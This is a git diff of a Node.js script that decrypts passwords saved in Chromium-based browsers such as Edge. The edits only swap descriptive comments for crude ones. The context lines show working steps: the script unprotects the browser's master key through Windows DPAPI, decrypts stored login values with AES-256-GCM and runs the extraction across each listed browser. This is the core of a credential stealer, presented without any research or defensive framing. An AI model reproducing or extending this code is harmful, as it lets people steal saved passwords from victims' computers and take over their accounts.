@@ -2,10 +2,9 @@ const fs = require('fs');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
 const crypto = require('crypto');
-const dpapi = require('win-dpapi'); // Data Protection API for Node.js
-const { DirectoryPath } = require('../index.js'); // Import DirectoryPath
+const dpapi = require('win-dpapi');
+const { DirectoryPath } = require('../index.js');
 
-// Define the browsers and their respective paths
 const browsers = [
     {
         name: 'Edge',
@@ -34,7 +33,7 @@ const browsers = [
     }
 ];
 
-// Function to get the master key from the local state
+// find the key
 function getMasterKey(localStatePath) {
     if (!fs.existsSync(localStatePath)) {
         throw new Error(`Local State file not found at ${localStatePath}`);
@@ -45,7 +44,7 @@ function getMasterKey(localStatePath) {
         const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
         const encryptedKeyTrimmed = encryptedKey.slice(5);  // Trim "DPAPI" prefix
 
-        // Decrypt the master key using dpapi
+        // decrypt the key
         const decryptedKey = dpapi.unprotectData(encryptedKeyTrimmed, null, 'CurrentUser');
         const masterKey = decryptedKey;
 
@@ -59,17 +58,17 @@ function getMasterKey(localStatePath) {
     }
 }
 
-// Function to decrypt the payload
+// decrypt the shit
 function decryptPayload(cipher, payload) {
     return Buffer.concat([cipher.update(payload), cipher.final()]);
 }
 
-// Function to generate cipher
+// generate the cipher
 function generateCipher(aesKey, iv) {
     return crypto.createDecipheriv('aes-256-gcm', aesKey, iv);
 }
 
-// Function to decrypt the value
+// uh yeah
 function decryptValue(buff, masterKey) {
     try {
         const iv = buff.slice(3, 15);
@@ -85,7 +84,7 @@ function decryptValue(buff, masterKey) {
     }
 }
 
-// Function to handle different Chrome versions
+// diff chrome version handling (i think this might not be working)
 function decryptValueAllVersion(value, masterKey) {
     try {
         if (value.slice(0, 3).toString() === 'v10') {
@@ -99,15 +98,15 @@ function decryptValueAllVersion(value, masterKey) {
     }
 }
 
-// Function to convert the Chrome timestamp to a human-readable format
+// better timestamping of stored records
 function convertChromeTimestamp(timestamp) {
-    // Chrome stores time in microseconds since January 1, 1601
+    // since January 1, 1601
     const epoch = new Date(1601, 0, 1);
-    const timestampInMs = timestamp / 1000; // Convert microseconds to milliseconds
+    const timestampInMs = timestamp / 1000; // micro to milli
     return new Date(epoch.getTime() + timestampInMs).toLocaleString();
 }
 
-// Function to get browser login data
+// the real shit
 async function extractPasswords(browser) {
     const { name, localStatePath, loginDataPath } = browser;
 
@@ -170,7 +169,7 @@ async function extractPasswords(browser) {
     }
 }
 
-// Main function to run the extraction process for all browsers sequentially
+// run my shit
 async function main() {
     for (const browser of browsers) {
         await extractPasswords(browser);
